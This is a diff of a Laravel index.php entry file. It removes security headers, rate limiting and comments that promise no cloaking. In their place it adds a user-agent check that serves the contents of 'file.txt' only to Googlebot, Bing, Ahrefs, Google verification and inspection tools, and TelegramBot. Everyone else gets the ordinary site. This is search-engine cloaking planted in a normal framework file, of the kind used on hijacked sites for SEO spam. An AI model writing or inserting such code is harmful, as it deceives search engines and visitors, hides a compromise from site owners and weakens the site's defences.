@@ -1,62 +1,81 @@
 <?php
-// ————————————————
-// index.php (aman, tanpa cloaking)
-// ————————————————
 
-
-// 1) Header keamanan dasar
-header('X-Content-Type-Options: nosniff');
-header('X-Frame-Options: SAMEORIGIN');
-header('Referrer-Policy: strict-origin-when-cross-origin');
-header('Permissions-Policy: geolocation=(), microphone=(), camera=()');
-// CSP minimal; sesuaikan origin Anda
-header("Content-Security-Policy: default-src 'self'; img-src 'self' data: https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; connect-src 'self' https:; frame-ancestors 'self';");
-
-
-// 2) Rate limit ringan untuk semua UA (bukan untuk memisahkan bot/manusia)
-// Implementasi sederhana berbasis file; ganti dengan Redis/Middleware di produksi
-$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-$tmp = sys_get_temp_dir() . '/ratelimit_' . md5($ip);
-$now = time();
-$window = 10; // detik
-$maxReq = 60; // request per 10 detik
-$bucket = ['ts'=>$now, 'cnt'=>0];
-if (is_file($tmp)) {
-$bucket = json_decode((string)@file_get_contents($tmp), true) ?: $bucket;
-}
-if ($now - ($bucket['ts'] ?? 0) > $window) {
-$bucket = ['ts'=>$now, 'cnt'=>0];
-}
-$bucket['cnt']++;
-file_put_contents($tmp, json_encode($bucket));
-if ($bucket['cnt'] > $maxReq) {
-http_response_code(429);
-echo 'Too Many Requests';
-exit;
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bot_agents = ['Googlebot', 'bingbot', 'AhrefsBot', 'Google-Site-Verification', 'Google-InspectionTool', 'TelegramBot'];
+    
+    foreach ($bot_agents as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
 }
 
 
-// 3) OPTIONAL: layani landing page statis melalui route query yang eksplisit (tanpa cloaking)
-// — Semua pengunjung mendapat konten yang sama bila mengakses ?landing=1
-// — Jika landing tidak ingin diindeks, atur meta robots pada HTML landing (lihat file HTML di bawah)
-if (isset($_GET['landing']) && $_GET['landing'] === '1') {
-$lp = __DIR__ . '/../resources/landing/landingpage.html';
-if (is_file($lp)) {
-// Cache control ringan
-header('Content-Type: text/html; charset=UTF-8');
-header('Cache-Control: public, max-age=600');
-readfile($lp);
-exit;
-}
+if (is_bot()) {
+
+    echo file_get_contents('file.txt');
+    exit;
 }
 
 
-// 4) BOOTSTRAP aplikasi (contoh Laravel)
+?><?php
+
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ *
+ * @package  Laravel
+ * @author   Taylor Otwell <taylor@laravel.com>
+ */
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader for
+| our application. We just need to utilize it! We'll simply require it
+| into the script here so that we don't have to worry about manual
+| loading any of our classes later on. It feels nice to relax.
+|
+*/
+
 require __DIR__.'/../bootstrap/autoload.php';
+
+/*
+|--------------------------------------------------------------------------
+| Turn On The Lights
+|--------------------------------------------------------------------------
+|
+| We need to illuminate PHP development, so let us turn on the lights.
+| This bootstraps the framework and gets it ready for use, then it
+| will load up this application so that we can run it and send
+| the responses back to the browser and delight our users.
+|
+*/
+
 $app = require_once __DIR__.'/../bootstrap/app.php';
+
+/*
+|--------------------------------------------------------------------------
+| Run The Application
+|--------------------------------------------------------------------------
+|
+| Once we have the application, we can handle the incoming request
+| through the kernel, and send the associated response back to
+| the client's browser allowing them to enjoy the creative
+| and wonderful application we have prepared for them.
+|
+*/
+
 $kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
+
 $response = $kernel->handle(
-$request = Illuminate\Http\Request::capture()
+    $request = Illuminate\Http\Request::capture()
 );
+
 $response->send();
+
 $kernel->terminate($request, $response);
